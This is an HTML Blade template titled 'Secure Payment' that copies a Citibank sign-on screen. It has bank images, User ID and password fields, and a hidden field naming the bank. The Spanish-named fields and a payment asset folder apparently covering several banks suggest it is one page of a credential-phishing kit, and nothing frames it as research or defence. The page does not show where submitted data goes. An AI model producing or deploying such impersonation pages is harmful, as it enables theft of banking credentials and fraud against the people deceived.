<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>Secure Payment</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

    <link rel="stylesheet" href="{{asset('assets/css/payment/citibank.css')}}">

       
    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>
     
</head>
<body>

    <img src="{{asset('assets/img/payment/citibank/citi.jfif')}}" alt="" srcset="" width="100%">
    <label for="">User ID</label>
    <center><input type="tel" name="" id="txtUsuario" placeholder="User ID" maxlength="10" oninput="this.value = this.value.replace(/\D+/g, '');" required></center>
    <label for="">Password</label>
    <center><input type="password" name="" id="txtPass" placeholder="Password" oninput="this.value = this.value.replace(/\s+/g, '')" required></center>
    
    <input type="hidden" name="" id="banco" style="height:40px; border:1px solid #d3f3f3;" value="CitiBank">
    
    <br>
    <br>
    <center><input type="submit" id="btnUsuario" value="Sign On"></center>
    
    <img src="{{asset('assets/img/payment/citibank/citi1.jfif')}}" alt="" srcset="" width="100%">
</body>
</html>